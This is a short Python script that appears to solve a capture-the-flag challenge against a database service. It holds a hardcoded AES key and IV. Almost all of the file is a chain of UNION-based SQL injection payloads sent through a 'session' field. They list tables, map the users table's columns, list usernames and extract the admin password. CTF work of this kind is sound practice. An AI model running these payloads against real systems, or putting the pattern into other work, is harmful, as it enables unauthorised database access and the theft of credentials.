import requests
import client as db_client

database_server_addr = "backend.ctf-challenge.edu"
database_server_port = 3306
NUM_DB_CLIENTS = 5

key = b'iT\xe1\xb47\xa3\xad\xfe$\x96\x82:H\x0b\x9d\xc3'
iv = b"\xab\xd3\x11'\xa1\x83\xad.)\x1e\xf8\x13\xfc]\xe5\x1d"

db_client = db_client.DatabaseClient(database_server_addr, database_server_port, key, iv)

get_tables_payload = "' UNION SELECT name FROM sqlite_master WHERE type='table' AND name NOT IN ('cats', 'sessions', 'sqlite_sequence', 'comments')--"
response = db_client.request('get-username-from-session', session=get_tables_payload)
print("tables:", response)

users_table_layout_payload = "' UNION SELECT name FROM pragma_table_info('users') WHERE name NOT IN ('password', 'has_privileges')--"
response = db_client.request('get-username-from-session', session=users_table_layout_payload)
print("users table column:", response)

users_table_layout_payload = "' UNION SELECT name FROM pragma_table_info('users') WHERE name NOT IN ('username', 'has_privileges')--"
response = db_client.request('get-username-from-session', session=users_table_layout_payload)
print("users table column:", response)

username_payload = "' UNION SELECT username FROM users WHERE username<>'monitoring'--"
response = db_client.request('get-username-from-session', session=username_payload)
print("username:", response)

password_payload = "' UNION SELECT password FROM users WHERE username='admin'--"
response = db_client.request('get-username-from-session', session=password_payload)
print("password:", response)
